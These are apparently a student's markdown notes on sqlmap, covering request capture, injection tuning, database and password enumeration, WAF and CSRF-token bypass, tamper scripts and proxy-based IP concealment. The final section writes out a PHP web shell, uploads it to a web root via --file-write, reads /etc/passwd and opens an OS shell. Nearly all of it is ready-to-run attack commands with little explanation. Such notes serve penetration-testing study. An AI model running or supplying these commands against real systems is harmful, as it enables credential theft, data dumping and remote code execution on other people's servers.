## Building Attacks 
### SQLMap With HTTP
Developer tools and copy as curl
#### Post Request
```shell
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```
#### Full Request 
##### Example
```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```
##### SQLMap Commands
```shell
 sqlmap -r req.txt
```
#### Custom Requests
##### Cookies
```shell
 sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

```shell
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```
##### Others
`--random-agent`
`--mobile`
`-method`

### Attack Tuning 
#### Prefix/ Suffix 
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- "
```
#### Level/ Risk
##### Level
`--level= 1-5` 
Extends both vectors and boundaries being used.
##### Risk 
`--risk= 1-3`
Extends the used vector set based on the risk of causing problems target side like database loss and DoS

#### Advanced Tuning 
##### Status Codes
fixate the detection of HTTP responses
ie `--code=200`
##### Title 
Titles switch can be used to instruct detection mechanisms to base comparison on content on html tag title
`--titles`
##### Strings 
Look for specific string value appearing true while absent being false.
`--string=success`
##### Techniques 
Can narrow down the user payload to a specific type 
`--technique`
i.e. `--technique=BEU`
##### UNION SQLi Tuning 
May require extra user-provided information to work. 
example:
`--union-cols=17`
`--union-char='a'`
`--union-form=users`


## SQLMap Errors 
#### View Errors 
`--parse-errors`
#### Store the Traffic 
`t <path>`
#### Verbose 
`-v` Different Levels 1-6 
#### Proxy Traffic 
`--proxy`
Can then look through BurpSuite 

## Database Enumeration
### Basic DB Data Enumeration
`--hostname`
`--curent-user`
`--curent-db`
`--passwords`
`--banner`
`--current-user`
`--current-db`
`--is-dba` - database admin
### Table Enumeration 
Dump all content with `--dump`
Select table `-T`
Select Columns `-C col1, col2....`

Narrow Down rows based on ordinal numbers
`--start=2 --stop=3`

Conditional Enumeration 
`--where="name LIKE 'f%'"`

Exclude SysDatabase `--dump-all --exclude-sysdbs`

### DB Schema Enumeration 
Retrieve the structure of all tables
`--schema`
### Searching for Data
`--search -T data `
`--search -C pass`
### Password Enumeration 
`--dump -D master -T users`
Get passwords:
`--passwords`

## Advanced Usage 
### Bypassing Web Application Protections 
#### Anti-CSRF Token Bypass
`--data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="<tokename>"`
#### Unique Value Bypass
`--randomize=<value>`
#### Calculated Parameter Bypass
`--eval="import hashlib; h=hashlib.md5(id).hexdigest()"`
#### IP Address Concealing 
`--proxy="socks4://177.39.187.70:33283"`
#### WAF Bypass
`--skip-waf`
#### User-agent Blacklisting 
`--random-agent`
#### Tamper Scripts
`--list-tampers`
##### List
|**Tamper-Script**|**Description**|
|---|---|
|`0eunion`|Replaces instances of UNION with e0UNION|
|`base64encode`|Base64-encodes all characters in a given payload|
|`between`|Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`|
|`commalesslimit`|Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart|
|`equaltolike`|Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart|
|`halfversionedmorekeywords`|Adds (MySQL) versioned comment before each keyword|
|`modsecurityversioned`|Embraces complete query with (MySQL) versioned comment|
|`modsecurityzeroversioned`|Embraces complete query with (MySQL) zero-versioned comment|
|`percentage`|Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)|
|`plus2concat`|Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart|
|`randomcase`|Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)|
|`space2comment`|Replaces space character ( ) with comments `/|
|`space2dash`|Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)|
|`space2hash`|Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`)|
|`space2mssqlblank`|Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters|
|`space2plus`|Replaces space character ( ) with plus (`+`)|
|`space2randomblank`|Replaces space character ( ) with a random blank character from a valid set of alternate characters|
|`symboliclogical`|Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)|
|`versionedkeywords`|Encloses each non-function keyword with (MySQL) versioned comment|
|`versionedmorekeywords`|Encloses each keyword with (MySQL) versioned comment|

#### Chunked 
`--chunked`
splits post requests into chunks

## OS Exploitation 
### File Read/ Write
#### Check for DBA privilgies
```shell
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```
#### Read Local Files 
```shell
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```
#### Write Local Files 
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```shell
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
### Command Execution
```shell
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
